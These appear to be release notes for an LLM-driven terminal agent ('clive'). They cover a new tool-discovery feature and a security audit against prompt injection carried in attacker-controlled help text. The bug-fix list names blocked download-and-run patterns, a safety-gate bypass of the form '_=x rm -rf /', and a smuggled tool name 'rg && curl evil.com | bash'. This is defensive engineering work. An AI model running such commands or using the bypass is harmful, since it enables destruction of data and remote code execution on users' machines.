# Release Notes

User-facing summary of notable changes. The dev-grade audit trail with one paragraph per bug fix lives in [`CHANGELOG.md`](CHANGELOG.md); this file collects the headline themes per release.

## Unreleased

### Self-learning tool discovery — `clive --explore <tool>` (gh#41)

Clive can now meet a CLI tool it has never used and write its own driver for it. Run

```bash
clive --explore rg
```

and clive opens a fresh tmux exploration pane, probes the tool with `--help` / `-h` / `man` / `tldr` plus a couple of safe read-only examples, then asks the LLM to synthesize `drivers/rg.md` from the exploration log. Future panes targeting that tool pick up the new driver automatically. The exploration is bounded (≤8 probes) and gated by an exploration-specific safety layer that refuses to launch credential-prompt tools (`aws`, `gh`, `kubectl`, `ssh`, …) and TUI tools (`vim`, `less`, `lazygit`, `k9s`, …) without an explicit help flag. Existing drivers (hand-written or auto-generated) are not overwritten unless you pass `--explore-overwrite`.

The full design is documented in [`docs/plans/2026-05-22-self-learning-tool-discovery.md`](docs/plans/2026-05-22-self-learning-tool-discovery.md). Two follow-on cards are explicitly deferred: audit-log-driven `refine_driver` (needs gh#40's eval orchestrator) and `CLIVE_AUTO_EXPLORE=1` auto-trigger from `_expand_toolset` (needs gh#39's category auto-classification).

### Hardened against an adversarial data plane

The discovery feature introduces a new threat shape: attacker-controlled `--help` text and attacker-supplied tool names flow into the LLM's input, so the safety architecture had to grow up. A `/scenario` → `/debug` audit pass surfaced 13 bugs (5 CRITICAL, 8 HIGH); all are closed. Highlights:

- **`_check_command_safety` now blocks `curl … | bash`, `wget … | sh`, `eval "$(curl …)"`, and `base64 -d | sh`** — the executable arm of prompt-injection-driven driver content. This affects every execution mode (script, interactive, planned, toolcall), not just discovery.
- **Underscore-only env-var prefixes no longer bypass the safety gate** — `_=x rm -rf /`, `_=x shutdown`, `_=x dd of=/dev/sda` had all PASSED the base safety check via an empty-string `isalnum()` edge case in the prefix stripper. The stripper now uses a POSIX env-var-name regex (`^[A-Za-z_][A-Za-z0-9_]*$`) and is shared with `_check_exploration_safety` so the same class of bypass is closed there too.
- **Tool names are validated at the top of the pipeline**, not at the terminal write step. A malicious name like `"rg && curl evil.com | bash"` can no longer flow into the exploration LLM's goal or the per-tool `/tmp/clive/` directory before being rejected. The regex is tighter (`^[a-z][a-z0-9_-]*$` — lowercase only, no dots) which also closes case-collision overwrites on macOS APFS (`RG` and `rg` are the same file) and `foo.md`-style filename confusion.
- **Reserved-name guard** — `--explore explore --explore-overwrite` would have clobbered the meta-driver. `RESERVED_NAMES` now refuses every hand-written driver shipped in `src/clive/drivers/` even with `overwrite=True`.
- **Driver writes are atomic** — `open(O_CREAT|O_EXCL)` for new drivers, write-tmp + `os.replace` for refresh. A fork-based race test that previously showed 15 of 30 processes "wrote successfully" simultaneously now produces exactly 1 winner and 29 `FileExistsError`s, no corruption.
- **Validator strictness** — `_validate_driver_text` now strips fenced code blocks before scanning (so decoy sections inside ```...``` don't count), requires each section exactly once, and enforces canonical order (ENVIRONMENT → PRIMARY TOOLS → PATTERNS → PITFALLS → RESPONSE FORMAT → COMPLETION). PITFALLS is no longer silently optional. `generate_driver` refuses to call the LLM on an empty `ExplorationResult` instead of letting it hallucinate.
- **Exploration panes are one-shot** — teardown now kills the tmux session and `rm`s the per-tool `/tmp/clive/explore-<tool>-<hex>/` directory. No more leaks across many invocations.
- **CLI surface is clean** — `handle_explore` catches the full set of expected errors (rate limits, network, permission denied, disk full, name validation) and returns non-zero exit codes with one-line messages instead of Python tracebacks.
- **Contract test** between `interactive_runner._emit("probe", …)` and `discovery.explorer.on_event` — any future refactor that drops, renames, or changes the arity of the `probe` event now fails loudly.

Full audit reproductions and per-bug discussion: [`debug/260523-0739-clive-discovery-bug-hunt/findings.md`](debug/260523-0739-clive-discovery-bug-hunt/findings.md).

### Deferred mitigations (tracked, not yet shipped)

These came out of the scenario session and remain open. They are not blockers for the feature shipping, but they are the highest-leverage structural improvements still on the board:

- **Quarantine for unreviewed auto-gen drivers** — new drivers should land in `drivers/.unreviewed/` and require an explicit promote step. Largest remaining mitigation against prompt-injection-flavoured driver content.
- **Driver provenance + version metadata in frontmatter** — `provenance: hand-written|auto-explore`, `explored_at:`, `target_version:`. Enables safe-refresh-vs-force-overwrite split for `--explore-overwrite` and programmatic stale-driver detection.
- **Per-probe wall-clock timeout + `PAGER=cat` env in the exploration pane** — defangs `man → less` traps and PS1-spoof attacks via behavioural detection.
- **Subcommand-tool exploration** — `clive --explore git` should probe `git status --help`, `git commit --help`, etc., not stop at the top-level `git --help`.

### Tests

990 → 1161 (+171) across the gh#41 effort. Of these, ~80 are regression tests pinning the security invariants above; the rest cover the feature surface itself.

---

## Earlier releases

See [`CHANGELOG.md`](CHANGELOG.md) for the full per-version history including 0.7.2 (bug-fix sweep), 0.7.1, and earlier.
